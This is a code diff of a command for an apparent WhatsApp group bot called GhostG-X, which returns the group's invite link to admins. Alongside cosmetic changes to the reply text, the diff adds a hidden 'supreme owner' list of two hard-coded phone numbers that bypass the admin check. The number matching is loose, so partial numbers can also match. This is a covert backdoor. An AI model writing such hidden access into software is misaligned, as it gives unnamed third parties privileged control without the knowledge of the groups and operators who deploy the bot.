@@ -26,7 +26,7 @@ module.exports = {
   name: 'grouplink',
   aliases: ['link', 'invite', 'portail'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ɢᴇɴᴇʀᴇ ʟᴇ ʟɪᴇɴ ᴅ\'ɪɴᴠɪᴛᴀᴛɪᴏɴ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ**',
+  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ɢᴇɴᴇʀᴇ ʟᴇ ʟɪᴇɴ ᴅ\'ɪɴᴠɪᴛᴀᴛɪᴏɴ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   usage: `${prefix}grouplink`, // 💡 Dynamique avec ton préfixe actuel
   groupOnly: true,
   adminOnly: true,
@@ -39,16 +39,20 @@ module.exports = {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
 
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise)
+      const supremeOwners = ['22651622652', '22665107481'];
+      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
+
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner;
+      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
 
       // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       if (!extra.isAdmin && !isMe) {
-        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       const code = await sock.groupInviteCode(extra.from);
@@ -56,18 +60,17 @@ module.exports = {
 
       const subject = extra.groupMetadata.subject || 'sᴀɴᴄᴛᴜᴀɪʀᴇ';
 
-      const text = `╭╼━≪• *ʟɪᴇɴ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ* •≫━╾╮\n` +
-                   `┃ 👥 *ɢʀᴏᴜᴘᴇ* : ${subject}\n` +
-                   `┃ 🔗 *ʟɪᴇɴ* : ${link}\n` +
-                   `╰━━━━━━━━━━━━━━━╯\n\n` +
-                   `⚠️ *${toSmallCaps('ne partage pas ce lien publiquement')} !*\n\n` +
-                   `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`;
+      const text = `*╭╼━━━≪• ʟɪᴇɴ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ •≫━━━╾╮*\n` +
+                   `*┃* 👥 *${toSmallCaps('groupe')} :* ${subject}\n` +
+                   `*┃* 🔗 *${toSmallCaps('lien')} :* ${link}\n\n` +
+                   `*┃* ⚠️ *${toSmallCaps('ne partage pas ce lien publiquement')} !*\n\n` +
+                   `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
 
       await reply(text);
 
     } catch (error) {
       console.error('GroupLink Error:', error);
-      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
     }
   }
 };
